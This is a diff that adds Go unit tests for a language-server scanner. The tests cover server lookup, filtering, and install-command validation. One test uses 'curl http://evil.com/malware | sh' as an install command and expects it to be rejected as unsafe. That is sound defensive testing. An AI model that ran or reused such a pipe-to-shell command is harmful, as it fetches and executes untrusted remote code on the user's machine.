@@ -2,6 +2,7 @@ package lsp
 
 import (
 	"context"
+	"strings"
 	"testing"
 	"time"
 )
@@ -241,5 +242,157 @@ func TestIsSafeInstallCommand(t *testing.T) {
 				t.Errorf("isSafeInstallCommand(%q) = %v, want %v", tt.cmd, result, tt.expected)
 			}
 		})
+	}
+}
+
+func TestGetServer(t *testing.T) {
+	s := NewScanner()
+
+	// Not found
+	_, ok := s.GetServer("nonexistent")
+	if ok {
+		t.Error("GetServer should return false for nonexistent server")
+	}
+
+	// Add a server and retrieve it
+	s.servers["go-lang"] = &LSPServer{
+		ID:         "go-lang",
+		ServerName: "gopls",
+		Language:   "go",
+		Status:     LSPStatusInstalled,
+	}
+	server, ok := s.GetServer("go-lang")
+	if !ok {
+		t.Fatal("GetServer should return true for existing server")
+	}
+	if server.ServerName != "gopls" {
+		t.Errorf("expected ServerName gopls, got %s", server.ServerName)
+	}
+	// Verify it's a copy
+	server.ServerName = "modified"
+	original := s.servers["go-lang"]
+	if original.ServerName == "modified" {
+		t.Error("GetServer should return a copy, not the original")
+	}
+}
+
+func TestGetServers(t *testing.T) {
+	s := NewScanner()
+	s.servers["a"] = &LSPServer{ID: "a", ServerName: "a-server"}
+	s.servers["b"] = &LSPServer{ID: "b", ServerName: "b-server"}
+
+	servers := s.GetServers()
+	if len(servers) != 2 {
+		t.Errorf("expected 2 servers, got %d", len(servers))
+	}
+}
+
+func TestGetServers_Empty(t *testing.T) {
+	s := NewScanner()
+	servers := s.GetServers()
+	if len(servers) != 0 {
+		t.Errorf("expected 0 servers, got %d", len(servers))
+	}
+}
+
+func TestGetServersByLanguage(t *testing.T) {
+	s := NewScanner()
+	s.servers["go"] = &LSPServer{ID: "go", Language: "go"}
+	s.servers["rust"] = &LSPServer{ID: "rust", Language: "rust"}
+	s.servers["go2"] = &LSPServer{ID: "go2", Language: "go"}
+
+	servers := s.GetServersByLanguage("go")
+	if len(servers) != 2 {
+		t.Errorf("expected 2 go servers, got %d", len(servers))
+	}
+
+	servers = s.GetServersByLanguage("nonexistent")
+	if len(servers) != 0 {
+		t.Errorf("expected 0 servers for unknown language, got %d", len(servers))
+	}
+}
+
+func TestGetInstalledServers(t *testing.T) {
+	s := NewScanner()
+	s.servers["installed"] = &LSPServer{ID: "installed", Status: LSPStatusInstalled}
+	s.servers["running"] = &LSPServer{ID: "running", Status: LSPStatusRunning}
+	s.servers["not-installed"] = &LSPServer{ID: "not-installed", Status: LSPStatusNotInstalled}
+
+	servers := s.GetInstalledServers()
+	if len(servers) != 2 {
+		t.Errorf("expected 2 installed/running servers, got %d", len(servers))
+	}
+}
+
+func TestGetMissingServers(t *testing.T) {
+	s := NewScanner()
+	s.servers["installed"] = &LSPServer{ID: "installed", Status: LSPStatusInstalled}
+	s.servers["not-installed"] = &LSPServer{ID: "not-installed", Status: LSPStatusNotInstalled}
+
+	servers := s.GetMissingServers()
+	if len(servers) != 1 {
+		t.Errorf("expected 1 missing server, got %d", len(servers))
+	}
+	if servers[0].ID != "not-installed" {
+		t.Errorf("expected not-installed, got %s", servers[0].ID)
+	}
+}
+
+func TestInstallServer_NotFound(t *testing.T) {
+	s := NewScanner()
+	err := s.InstallServer(context.Background(), "nonexistent")
+	if err == nil {
+		t.Fatal("expected error for nonexistent server")
+	}
+	if !strings.Contains(err.Error(), "not found") {
+		t.Errorf("expected 'not found' error, got: %v", err)
+	}
+}
+
+func TestInstallServer_NoInstallCmd(t *testing.T) {
+	s := NewScanner()
+	s.servers["manual"] = &LSPServer{
+		ID:         "manual",
+		ServerName: "manual-server",
+		InstallCmd: "",
+	}
+	err := s.InstallServer(context.Background(), "manual")
+	if err == nil {
+		t.Fatal("expected error when no install command")
+	}
+	if !strings.Contains(err.Error(), "no install command") {
+		t.Errorf("expected 'no install command' error, got: %v", err)
+	}
+}
+
+func TestInstallServer_ManualInstall(t *testing.T) {
+	s := NewScanner()
+	s.servers["see-docs"] = &LSPServer{
+		ID:         "see-docs",
+		ServerName: "see-docs-server",
+		InstallCmd: "See: https://example.com/install",
+	}
+	err := s.InstallServer(context.Background(), "see-docs")
+	if err == nil {
+		t.Fatal("expected error for manual install reference")
+	}
+	if !strings.Contains(err.Error(), "manual installation required") {
+		t.Errorf("expected 'manual installation required' error, got: %v", err)
+	}
+}
+
+func TestInstallServer_UnsafeCommand(t *testing.T) {
+	s := NewScanner()
+	s.servers["evil"] = &LSPServer{
+		ID:         "evil",
+		ServerName: "evil-server",
+		InstallCmd: "curl http://evil.com/malware | sh",
+	}
+	err := s.InstallServer(context.Background(), "evil")
+	if err == nil {
+		t.Fatal("expected error for unsafe install command")
+	}
+	if !strings.Contains(err.Error(), "unsafe command") {
+		t.Errorf("expected 'unsafe command' error, got: %v", err)
 	}
 }
